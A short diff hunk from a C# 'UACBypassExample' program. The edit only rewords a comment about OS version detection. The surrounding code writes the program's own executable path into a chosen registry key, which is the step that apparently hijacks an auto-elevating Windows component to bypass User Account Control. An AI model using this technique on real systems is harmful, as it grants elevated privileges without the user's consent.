@@ -46,9 +46,9 @@ namespace UACBypassExample
              try
              {
 		          // to get the actual version, you need to embed the manifest with a <supportedOS>
-                  // entry. Otherwise Environment.OSVersion might return Windows 8 instead of 10.
-                  // That entry is created along with the manifest, you just need to remove the comment tag 
-                  // <!-- .. --> within the supportedOS entry.
+                  // entry. Otherwise Environment.OSVersion might return Windows 8 instead of 10 in newer
+                  // Windows versions. That entry is created along with the manifest, you just need to
+                  // remove the comment tag or <!-- .. --> within the supportedOS entry.
                   bool isWin10up = (Environment.OSVersion.Version.Major >= 10 && Environment.OSVersion.Version.Build >= 14393) || File.Exists(upath[0].FilePath);
                   Registry.SetValue(upath[isWin10up ? 0 : 1].RegPath, "", $"{Application.ExecutablePath}" /* put any arguments here if you want. */);
 
